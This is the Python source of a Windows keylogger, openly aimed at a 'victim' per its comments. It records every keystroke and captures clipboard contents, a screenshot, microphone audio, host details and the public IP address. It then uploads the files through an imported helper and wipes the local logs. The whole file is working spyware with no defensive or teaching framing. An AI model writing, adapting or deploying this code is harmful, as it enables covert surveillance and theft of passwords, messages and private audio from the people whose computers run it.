# imports or third party libraries
import time  # provides various time-related functions and classes
import socket  # low-level networking interfaces
import platform  # provides info about sys
import win32clipboard  # provides access to windows clipboard
from requests import get  # sending http requests
from pynput.keyboard import Key, Listener  # monitoring and controlling of keyboard
from scipy.io.wavfile import write  # writing audio data to WAV file
import sounddevice as sd  # playing and recording sound
from PIL import ImageGrab  # screenshots
from dbupload import upload_file

# variables
file_path = "F:\\project\\files"
extend = "\\"
ss_info = "ss.png"
keys_info = "key_log.txt"
audio_info = "audio_info.wav"
system_info = "System_info.txt"
clipboard_info = "Clipboard_info.txt"

keys = []
count = 0
microphone_time = 10
total_time = 30
currentTime = time.time()
stopping_time = time.time() + total_time

# function to get victim machine details


def sys_info():
    with open(file_path + extend + system_info, "w") as f:
        hostname = socket.gethostname()
        ipaddr = socket.gethostbyname(hostname)

        try:
            public_ip = get("https://api.ipify.org").text
            f.write(time.strftime("%H:%M:%S"))
            f.write("\npublic ip_addr:" + public_ip + "\n")
        except Exception:
            f.write("Couldn't get public ip_addr" + "\n")

        f.write("Processor: " + (platform.processor()))
        f.write("\nSystem: " + platform.system() + " " + platform.version())
        f.write("\nMachine: " + platform.machine())
        f.write("\nHostname: " + hostname)
        f.write("\nPrivate Ip Addr: " + ipaddr)
        f.write("\n-----------------------------------\n")


sys_info()  # calling function

#  function to get audio from victim
def microphone():
    fs = 44100  # sampling frequency
    seconds = microphone_time

    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_info, fs, recording)

# function to take a screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + ss_info)

# function to get copied data by the victim
def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            f.write("\n-------------------------------\n")
            f.write(time.strftime("%H:%M:%S"))
            f.write("\nClipboard data: " + str(pasted_data))
            win32clipboard.CloseClipboard()
        except Exception:
            f.write("Clipboard data can't be copied")


# function to write key logs to a file
def write_file(keys):
    with open(file_path + extend + keys_info, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") >= 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)
            elif k.find("enter") >= 0:
                f.write("\nat " + time.strftime("%H:%M:%S") + "\n")
        f.close()

def on_press(key):
    global keys, count, currentTime
    print(key)
    keys.append(key)  # adding key to keys[list]
    count += 1
    currentTime = time.time()
    if count >= 1:
        count = 0
        write_file(keys)  # calling function
        keys = []


def on_release(key: Key) -> bool:
    if key == Key.esc:
        return False
    if currentTime > stopping_time:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        print("Program terminated by user")


copy_clipboard()
screenshot()
microphone()


if currentTime > stopping_time:
    upload_file()
    with open(file_path + extend + keys_info, "w") as f:
        f.write(" ")
    with open(file_path + extend + clipboard_info, "w") as f:
        f.write(" ")
